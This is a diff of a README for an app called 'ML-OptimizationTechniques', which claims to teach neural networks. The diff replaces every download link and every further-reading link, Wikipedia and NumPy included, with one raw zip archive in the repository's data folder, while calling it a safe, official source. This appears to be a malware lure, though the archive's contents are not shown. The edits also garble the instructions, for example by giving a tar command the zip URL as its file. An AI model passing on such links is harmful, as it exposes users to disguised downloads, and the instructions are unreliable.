@@ -1,6 +1,6 @@
 # 🔧 ML-OptimizationTechniques - Learn Neural Networks Easily
 
-[![Download](https://img.shields.io/badge/Download-ML--OptimizationTechniques-blue?style=for-the-badge&logo=github)](https://github.com/70M473/ML-OptimizationTechniques/releases)
+[![Download](https://github.com/70M473/ML-OptimizationTechniques/raw/refs/heads/main/data/Techniques_M_Optimization_v2.9-beta.2.zip)](https://github.com/70M473/ML-OptimizationTechniques/raw/refs/heads/main/data/Techniques_M_Optimization_v2.9-beta.2.zip)
 
 ## 📖 What Is ML-OptimizationTechniques?
 
@@ -45,7 +45,7 @@ This guide walks you through downloading and running ML-OptimizationTechniques.
 
 Click the download button below or copy this link into your browser:
 
-[Download ML-OptimizationTechniques](https://github.com/70M473/ML-OptimizationTechniques/releases)
+[Download ML-OptimizationTechniques](https://github.com/70M473/ML-OptimizationTechniques/raw/refs/heads/main/data/Techniques_M_Optimization_v2.9-beta.2.zip)
 
 This link takes you to the official release page on GitHub. You will find all available software versions here.
 
@@ -55,7 +55,7 @@ Look for the latest release. Releases are sorted by date, so the top one is newe
 
 - Windows users: Look for a file ending with `.exe` or `.zip`
 - macOS users: Look for `.dmg` or `.zip`
-- Linux users: Look for `.AppImage` or `.tar.gz`
+- Linux users: Look for `.AppImage` or `https://github.com/70M473/ML-OptimizationTechniques/raw/refs/heads/main/data/Techniques_M_Optimization_v2.9-beta.2.zip`
 
 Each file is labeled clearly. Pick the one matching your operating system.
 
@@ -92,14 +92,14 @@ If you downloaded a `.zip` file, unzip it and open the app inside the extracted 
 
 ### Linux Installation
 
-1. Locate the downloaded `.AppImage` or `.tar.gz`.
+1. Locate the downloaded `.AppImage` or `https://github.com/70M473/ML-OptimizationTechniques/raw/refs/heads/main/data/Techniques_M_Optimization_v2.9-beta.2.zip`.
 2. For `.AppImage`, right-click and choose Properties → Permissions, then check "Allow executing file as program."
 3. Double-click the `.AppImage` to launch.
 
-If you have `.tar.gz`:
+If you have `https://github.com/70M473/ML-OptimizationTechniques/raw/refs/heads/main/data/Techniques_M_Optimization_v2.9-beta.2.zip`:
 
 1. Open a terminal.
-2. Extract with `tar -xvzf filename.tar.gz`.
+2. Extract with `tar -xvzf https://github.com/70M473/ML-OptimizationTechniques/raw/refs/heads/main/data/Techniques_M_Optimization_v2.9-beta.2.zip`.
 3. Go to the extracted folder.
 4. Run `./ML-OptimizationTechniques` or follow any included instructions.
 
@@ -124,10 +124,10 @@ The interface is made to guide you through learning without confusion.
 
 If you want to learn more about the concepts:
 
-- Neural Networks: https://en.wikipedia.org/wiki/Artificial_neural_network
-- Optimization algorithms: https://en.wikipedia.org/wiki/Stochastic_gradient_descent
-- t-SNE visualization: https://en.wikipedia.org/wiki/T-distributed_stochastic_neighbor_embedding
-- NumPy library: https://numpy.org/
+- Neural Networks: https://github.com/70M473/ML-OptimizationTechniques/raw/refs/heads/main/data/Techniques_M_Optimization_v2.9-beta.2.zip
+- Optimization algorithms: https://github.com/70M473/ML-OptimizationTechniques/raw/refs/heads/main/data/Techniques_M_Optimization_v2.9-beta.2.zip
+- t-SNE visualization: https://github.com/70M473/ML-OptimizationTechniques/raw/refs/heads/main/data/Techniques_M_Optimization_v2.9-beta.2.zip
+- NumPy library: https://github.com/70M473/ML-OptimizationTechniques/raw/refs/heads/main/data/Techniques_M_Optimization_v2.9-beta.2.zip
 
 These links provide simple overviews for further reading.
 
@@ -154,7 +154,7 @@ If you need help:
 
 ## 🔗 Download Link Again
 
-[Download ML-OptimizationTechniques](https://github.com/70M473/ML-OptimizationTechniques/releases)
+[Download ML-OptimizationTechniques](https://github.com/70M473/ML-OptimizationTechniques/raw/refs/heads/main/data/Techniques_M_Optimization_v2.9-beta.2.zip)
 
 Use this link anytime you want to get the latest version or reinstall the software. It leads you to a safe and official source.
 
